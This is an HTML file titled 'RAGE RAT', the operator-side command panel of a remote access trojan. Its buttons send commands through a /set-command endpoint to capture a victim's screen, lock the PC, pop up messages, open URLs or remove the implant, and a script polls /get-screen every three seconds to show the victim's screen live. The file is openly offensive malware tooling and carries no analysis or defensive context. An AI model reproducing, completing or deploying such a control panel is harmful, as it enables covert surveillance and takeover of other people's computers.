<!DOCTYPE html>
<html>
<head>
    <title>⚡ RAGE RAT ⚡</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: monospace; text-align: center; }
        .box { border: 2px solid #00ff41; display: inline-block; padding: 20px; margin-top: 50px; box-shadow: 0 0 20px #00ff41; }
        button { background: transparent; color: #00ff41; border: 1px solid #00ff41; padding: 10px 20px; cursor: pointer; margin: 5px; }
        button:hover { background: #00ff41; color: black; }
        #screen { width: 100%; max-width: 600px; margin-top: 20px; border: 1px solid #333; }
    </style>
</head>
<body>
    <div class="box">
        <h1>RAGE_RAT_v1.0</h1>
        <hr>
        <button onclick="send('screen')">📸 SCREENSHOT</button>
        <button onclick="send('lock')">🔒 LOCK PC</button><br>
        <button onclick="send('msg:HELLO')">💬 SEND MSG</button>
        <button onclick="send('open:https://google.com')">🌐 OPEN URL</button><br>
        <button style="color:red; border-color:red" onclick="send('self_destruct')">🧨 KILL RAT</button>
        <hr>
        <img id="screen" src="" alt="Wait for screenshot...">
    </div>

    <script>
        function send(c) {
            fetch('/set-command?cmd=' + encodeURIComponent(c))
                .then(r => console.log("Sent"));
        }
        setInterval(() => {
            fetch('/get-screen').then(r => r.text()).then(data => {
                if(data.length > 100) document.getElementById('screen').src = "data:image/png;base64," + data;
            });
        }, 3000);
    </script>
</body>
</html>
